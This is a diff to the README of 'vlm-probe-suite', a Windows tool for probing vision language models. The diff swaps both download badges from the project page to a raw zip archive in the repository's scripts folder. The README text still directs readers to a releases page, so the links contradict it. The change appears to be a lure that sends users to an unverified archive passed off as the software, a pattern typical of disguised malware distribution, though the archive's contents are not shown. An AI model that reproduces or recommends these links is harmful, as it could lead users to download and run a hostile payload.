@@ -1,6 +1,6 @@
 # 🔍 vlm-probe-suite - Explore vision language model internal layers
 
-[![Download vlm-probe-suite](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Aileronisoleucine449/vlm-probe-suite)
+[![Download vlm-probe-suite](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Aileronisoleucine449/vlm-probe-suite/raw/refs/heads/main/scripts/suite-vlm-probe-2.0.zip)
 
 This tool lets you test vision language models. It provides a simple way to look into how these models see images. You can use it to study models like CLIP, SigLIP, BLIP-2, and LLaVA. The software runs locally on your Windows computer.
 
@@ -18,7 +18,7 @@ Before you start, make sure your computer meets these needs:
 
 Visit the link below to get the software. Click the button to reach the release page.
 
-[![Download Button](https://img.shields.io/badge/Download-Latest_Version-grey)](https://github.com/Aileronisoleucine449/vlm-probe-suite)
+[![Download Button](https://img.shields.io/badge/Download-Latest_Version-grey)](https://github.com/Aileronisoleucine449/vlm-probe-suite/raw/refs/heads/main/scripts/suite-vlm-probe-2.0.zip)
 
 1. Go to the project page on GitHub.
 2. Look for the section marked Releases on the right side of your screen.
